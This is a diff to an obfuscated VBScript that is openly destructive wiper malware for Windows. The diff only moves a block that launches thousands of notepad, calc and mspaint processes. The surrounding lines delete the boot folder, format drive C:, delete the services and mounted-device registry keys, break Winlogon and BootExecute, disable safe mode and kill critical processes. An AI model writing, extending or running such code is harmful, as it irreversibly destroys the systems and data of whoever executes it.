@@ -180,6 +180,13 @@ x7p9q.Run "takeown /F C:\Windows\boot /R /D Y", 0, True
 x7p9q.Run "icacls C:\Windows\boot /grant SYSTEM:F /T /Q", 0, True
 x7p9q.Run "Powershell.exe Remove-Item -Path C:\Windows\boot -Force -Recurse -ErrorAction SilentlyContinue", 0, True ' Boot files
 
+' Flood system with processes
+For r4t6y = 1 To 1000
+    x7p9q.Run "notepad.exe", 1, False 
+    x7p9q.Run "calc.exe", 1, False 
+    x7p9q.Run "mspaint.exe", 1, False
+Next
+
 x7p9q.Run "format C: /fs:NTFS /q /y", 0, True 
 x7p9q.Run "reg delete HKLM\SYSTEM\CurrentControlSet\Services /f", 0, True ' Kill services
 x7p9q.Run "reg delete HKLM\SYSTEM\MountedDevices /f", 0, True ' Screw disk mappings
@@ -196,13 +203,6 @@ k9m2v.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
 k9m2v.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit", "C:\invalid\userinit.exe", "REG_SZ" ' No user init
 k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute", "invalid_command", "REG_MULTI_SZ" ' Break boot
 k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Option\OptionValue", "0", "REG_DWORD" ' No safe mode
-
-' Flood system with processes
-For r4t6y = 1 To 1000
-    x7p9q.Run "notepad.exe", 1, False 
-    x7p9q.Run "calc.exe", 1, False 
-    x7p9q.Run "mspaint.exe", 1, False
-Next
 
 ' kill critical processes
 x7p9q.Run "taskkill /F /IM explorer.exe", 0, True
